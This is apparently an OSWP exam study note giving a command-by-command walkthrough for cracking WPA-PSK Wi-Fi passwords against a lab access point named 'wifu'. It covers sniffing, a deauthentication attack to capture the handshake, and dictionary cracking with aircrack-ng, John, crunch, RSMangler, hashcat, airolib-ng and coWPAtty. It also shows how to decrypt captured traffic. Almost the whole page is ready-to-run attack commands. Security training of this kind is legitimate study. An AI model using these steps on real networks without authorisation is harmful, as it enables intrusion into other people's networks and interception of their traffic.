---
{"dg-publish":true,"permalink":"/oswp/d-psk-cracking/"}
---

------------
### Crack walkthrough:
1. Sniff nearby APs:
```
sudo airodump-ng wlan0mon
```
2. Tune dump with channel and SSIDs:
```
sudo airodump-ng -c 3 -w wpa --essid wifu --bssid 34:08:04:09:3D:38 wlan0mon
```
3. Start deauth:
```
sudo aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F wlan0mon
```
- If not captures handshake try without "-c"
4. Crack handshake:
```
aircrack-ng -w /usr/share/john/password.lst -e wifu -b 34:08:04:09:3D:38 wpa-01.cap
```
5. Decrypt traffic:
```
airdecap-ng -b 34:08:04:09:3D:38 -e wifu -p 12345678 wpa-01.cap
```

---
### John cracking:
```
john --wordlist=/usr/share/john/password.lst --rules --stdout | aircrack-ng -e wifu -w - ~/wpa-01.cap
```

----------------
### Crunch:
- Generate password lists
- Usage:
```
crunch <minlength> <maxlength> <characters> -t <pattern> -p <words>
```
- Example:
```
crunch 11 11 0123456789 -t password@@@
-
Crunch will now generate the following number of lines: 1000
password000
password001
password002
password003
```
- Example 2:
```
crunch 5 5 -t ddd% | aircrack-ng -e wifu crunch-01.cap -w -
```

--------
### RSMangler
- Ruby script for modifying wordlists in all ways
- Usage:
```
rsmangler --file wordlist.txt --min 12 --max 13 --output mangled.txt
```
Use with aircrack:
```
rsmangler --file wordlist.txt --min 12 --max 13 | aircrack-ng -e wifu rsmangler-01.cap -w -
```

-----
### Hashcat
- List cracking devices:
```
hashcat -I
```
- Run benchmark for mode:
```
hashcat -b -m <mode>
```
- Specify device:
```
hashcat -d <device-nr>
```
- Specify device type (CPU, GPU, FPGSA, DSP etc.):
```
hashcat -D <device-type>
```
- Convert .cap to hashcat-compatible:
```
/usr/lib/hashcat-utils/cap2hccapx.bin wifu-01.cap output.hccapx  
```
- Crack the hash:
```
hashcat -m 2500 output.hccapx /usr/share/john/password.lst  
```

------------
### Airolib-ng
- Tool to pre-generate PMKs which lets aircrack-ng check more than 50000 hashes/second
- Usage:
1. Create file containing ESSID of target AP:
```
echo wifu > essid.txt
```
2. Import ESSID into database:
```
airolib-ng <db-name>.sqlite --import essid essid.txt
```
3. List info about DB:
```
airolib-ng <db-name>.sqlite --stats
```
4. Import passwords to DB:
```
airolib-ng <db-name>.sqlite --import passwd /usr/share/john/password.lst
```
5. Process DB and generate PMKs:
```
airolib-ng <db-name>.sqlite --batch
```
6. Initiate crack:
```
aircrack-ng -r <db-name>.sqlite wpa1-01.cap
```

---------
### coWPAtty:
- Similar to airolib-ng, creates rainbow tables for ESSIDs
- Usage:
1. Generate table:
```
genpmk -f /usr/share/john/password.lst -d <outfile> -s <essid>
```
2. Crack with coWPAtty:
```
cowpatty -r wpajohn-01.cap -d <outfile> -s wifu
```

